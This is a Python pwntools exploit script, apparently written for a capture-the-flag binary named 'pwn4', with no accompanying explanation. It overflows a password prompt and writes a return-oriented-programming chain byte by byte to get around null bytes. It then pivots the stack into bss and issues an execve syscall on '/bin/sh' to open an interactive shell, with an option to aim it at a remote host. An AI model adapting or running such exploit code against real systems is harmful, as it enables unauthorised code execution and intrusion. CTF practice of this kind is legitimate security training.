from pwn import *
import sys
remote_addr = ["",]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn4")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)


debug('b *0x4005c0')
pop_rdi = 0x400706
pop_rsi = 0x410043
pop_rdx = 0x448c95
pop_rdx_rsi = 0x44b249
pop_rax = 0x4005af
pop_rbp = 0x400b18
leave_ret = 0x475b22
syscall = 0x4012bc
bss = 0x6b6000
payload = flat(pop_rdi, 0, pop_rdx_rsi, 0x100, bss, 0x448c80, pop_rbp, bss, leave_ret)
i = len(payload) - 1
print(payload.hex(), i)

while i >= 0:
    if payload[i] == 0:
        sa(b'password:\n', b"PASSWORD".ljust(0x108, b'a') + b'b' * i)
        i -= 1
    else:
        j = i
        while payload[j] != 0:
            j -= 1
        sa(b'password:\n', b'PASSWORD'.ljust(0x108, b'a') + b'b' * (j + 1) + payload[j + 1: i + 1])
        i = j

sa(b'password:\n', b'PASSWORD\x00')
pause()
s(b'/bin/sh\x00' + flat(pop_rdi, bss, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall))

shell()
